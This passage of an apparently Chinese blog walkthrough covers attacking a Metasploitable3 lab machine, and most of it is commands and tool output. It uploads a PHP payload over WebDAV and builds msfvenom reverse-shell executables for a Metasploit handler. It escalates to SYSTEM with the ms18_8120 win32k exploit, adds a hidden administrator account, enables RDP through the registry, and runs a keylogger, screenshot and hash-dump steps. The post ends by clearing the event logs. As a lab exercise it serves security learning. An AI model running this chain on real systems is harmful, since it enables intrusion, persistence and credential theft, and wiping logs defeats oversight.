+<h2 id="向目标传马"><a href="#向目标传马" class="headerlink" title="向目标传马"></a>向目标传马</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http://192.168.114.29:8585/uploads -uploadfile ~/Desktop/11111.php -uploadloc 11111.php</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN		SUCCEED:		http://192.168.114.29:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.114.29:8585/uploads/11111.php</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="literal">yes</span>       The listen<span class="built_in"> address </span>(an<span class="built_in"> interface </span>may be specified)</span><br><span class="line">   LPORT  4444             <span class="literal">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.114.176</span><br><span class="line">lhost =&gt; 192.168.114.176</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 11111</span><br><span class="line">lport =&gt; 11111</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.114.176:11111</span><br></pre></td></tr></table></figure>
+<ol start="9">
+<li><p>攻击机访问一下<a href="http://192.168.114.29:8585/uploads/11111.php" target="_blank" rel="noopener">http://192.168.114.29:8585/uploads/11111.php</a></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 1 <span class="selector-tag">opened</span> (192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.176</span><span class="selector-pseudo">:11111</span> <span class="selector-tag">-</span>&gt; 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span><span class="selector-pseudo">:53286)</span> <span class="selector-tag">at</span> 2019<span class="selector-tag">-01-23</span> 14<span class="selector-pseudo">:44</span><span class="selector-pseudo">:18</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>成功弹shell</p>
+</li>
+</ol>
+<h2 id="ms18-8120提权"><a href="#ms18-8120提权" class="headerlink" title="ms18_8120提权"></a>ms18_8120提权</h2><ol start="11">
+<li><p>查看当前用户</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOCAL<span class="built_in"> SERVICE </span>(0)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入shell查systeminfo</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">shell</span></span><br><span class="line"><span class="selector-tag">Process</span> 4520 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Channel</span> 0 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Microsoft</span> <span class="selector-tag">Windows</span> <span class="selector-attr">[Version 6.1.7601]</span></span><br><span class="line"><span class="selector-tag">Copyright</span> (<span class="selector-tag">c</span>) 2009 <span class="selector-tag">Microsoft</span> <span class="selector-tag">Corporation</span>.  <span class="selector-tag">All</span> <span class="selector-tag">rights</span> <span class="selector-tag">reserved</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">wamp</span>\<span class="selector-tag">bin</span>\<span class="selector-tag">apache</span>\<span class="selector-tag">Apache2</span><span class="selector-class">.2</span><span class="selector-class">.21</span>&gt;<span class="selector-tag">systeminfo</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Terminate</span> <span class="selector-tag">channel</span> 0? <span class="selector-attr">[y/N]</span>  <span class="selector-tag">y</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">shell</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">sysinfo</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">sysinfo</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; </span><br><span class="line"><span class="selector-attr">[*]</span> 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span> <span class="selector-tag">-</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 2 <span class="selector-tag">closed</span>.  <span class="selector-tag">Reason</span>: <span class="selector-tag">Died</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>桥接模式下，因为多人共用路由网络太差了，会话很容易断，现在改为NAT模式测试</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.128</span></span><br><span class="line">靶机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.134</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造exe反弹shell上传到靶机</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter<span class="emphasis">_reverse_</span>tcp LHOST=192.168.75.128 LPORT=2222 -f exe -o ~/Desktop/2222.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 179779 bytes</span><br><span class="line">Final size of exe file: 254976 bytes</span><br><span class="line">Saved as: /root/Desktop/2222.exe</span><br><span class="line">root@kali:~# davtest -url http://192.168.75.134:8585/uploads -uploadfile ~/Desktop/2222.exe -uploadloc 2222.exe</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN		SUCCEED:		http://192.168.75.134:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.75.134:8585/uploads/2222.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过shell运行exe,执行漏洞exp,权限从SERVICE提升为SYSTEM</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3  <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/<span class="comment">meterpreter_reverse_tcp</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (exploit/<span class="comment">multi</span>/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload <span class="keyword">options</span> (windows/<span class="comment">meterpreter_reverse_tcp):</span></span><br><span class="line"></span><br><span class="line">   Name        <span class="comment">Current Setting  Required  Description</span></span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   EXITFUNC    <span class="comment">process          yes       Exit technique (Accepted:</span> <span class="comment">''</span><span class="comment">, seh, thread, process, none)</span></span><br><span class="line">   EXTENSIONS                   <span class="comment">no        Comma-separate list of extensions to load</span></span><br><span class="line">   EXTINIT                      <span class="comment">no        Initialization strings for extensions</span></span><br><span class="line">   LHOST       <span class="comment">192.168.75.128   yes       The listen address (an interface may be specified)</span></span><br><span class="line">   LPORT       <span class="comment">1111             yes       The listen port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit <span class="comment">target:</span></span><br><span class="line"></span><br><span class="line">   Id  <span class="comment">Name</span></span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard <span class="comment">Target</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; set lport <span class="number">2222</span></span><br><span class="line">lport =&gt; <span class="number">2222</span></span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; run -j -z</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job 0.</span></span><br><span class="line">[*] Exploit <span class="comment">completed, but no session was created.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP handler on 192.168.75.128:2222</span> </span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/<span class="comment">windows  LOCAL SERVICE (0) @ METASPLOITABLE3  192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; execute -f <span class="comment">"C:\\wamp\\www\\uploads\\2222.exe"</span></span><br><span class="line">Process <span class="number">6076</span> created.</span><br><span class="line">meterpreter &gt; [*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">2222</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55448</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">27</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; sessions -l</span></span><br><span class="line"></span><br><span class="line">Active <span class="comment">sessions</span></span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  <span class="comment">Name  Type                     Information                                   Connection</span></span><br><span class="line">  --  ----  ----                     -----------                                   ----------</span><br><span class="line">  2         meterpreter <span class="comment">php</span>/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3           <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/<span class="comment">windows  NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3  192.168.75.128:2222 -&gt; 192.168.75.134:55448 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; use exploit/<span class="comment">windows</span>/local/<span class="comment">ms18_8120_win32k_privesc</span></span><br><span class="line">msf5 <span class="comment">exploit(windows</span>/local/<span class="comment">ms18_8120_win32k_privesc) &gt; show options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="comment">options (exploit</span>/windows/<span class="comment">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   <span class="keyword">yes</span>       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; set session <span class="number">3</span></span><br><span class="line">session =&gt; <span class="number">3</span></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[+] Exploit finished, wait <span class="keyword">for</span> privileged payload execution to complete.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span></span><br><span class="line">[*] Meterpreter session <span class="number">4</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55526</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">57</span>:<span class="number">19</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\<span class="keyword">SYSTEM</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="远程监控"><a href="#远程监控" class="headerlink" title="远程监控"></a>远程监控</h2><ol start="16">
+<li>可通过run vnc实现，也可以添加用户远程登陆<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; net user</span><br><span class="line">[-] Unknown command: net.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5892 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net localgroup administrators xiaoming /add</span><br><span class="line">net localgroup administrators xiaoming /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>PS:开启3389端口:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</li>
+</ul>
+<ol start="17">
+<li>用户成功添加xiaoming<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  xiaoming                 </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="简单后渗透尝试"><a href="#简单后渗透尝试" class="headerlink" title="简单后渗透尝试"></a>简单后渗透尝试</h2><ol start="18">
+<li><p>查看是否为虚拟机</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[<span class="meta">*</span>] Checking <span class="keyword">if</span> METASPLOITABLE3 <span class="keyword">is</span> a Virtual Machine .....</span><br><span class="line">[<span class="meta">+</span>] This <span class="keyword">is</span> a VMware Virtual Machine</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户是否在线</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; quser</span><br><span class="line">[-] Unknown command: quser.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5828 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;quser</span><br><span class="line">quser</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line"> vagrant              <span class="built_in"> console </span>            1  Active      none   1/22/2019 6:06 PM</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>检查闲置多久</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 6 hours 20 mins 34 secs</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>多次截图对比管理员是否有操作</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">screenshot</span></span><br><span class="line"><span class="built_in">Screenshot</span> saved <span class="keyword">to</span>: /root/KMcxOzFn.jpeg</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/KMcxOzFn.jpeg?raw=true" alt=""></p>
+<ol start="22">
+<li>获取用户hash<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190123165519.png?raw=true" alt=""></li>
+<li><p>键盘监控，不过没成功。。。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke<span class="built_in"> sniffer </span><span class="built_in">..</span>.</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>还有很多骚操作日后尝试。。现在最重要就是清除痕迹(事件日志)</p>
+</li>
+</ol>
+<blockquote>
+<p>clearev</p>
+</blockquote>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    
+	<div>
+	
+		﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	
+	</div>
+	
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/05/PCB2018部分Writeup/" rel="next" title="PCB2018部分Writeup">
+                <i class="fa fa-chevron-left"></i> PCB2018部分Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
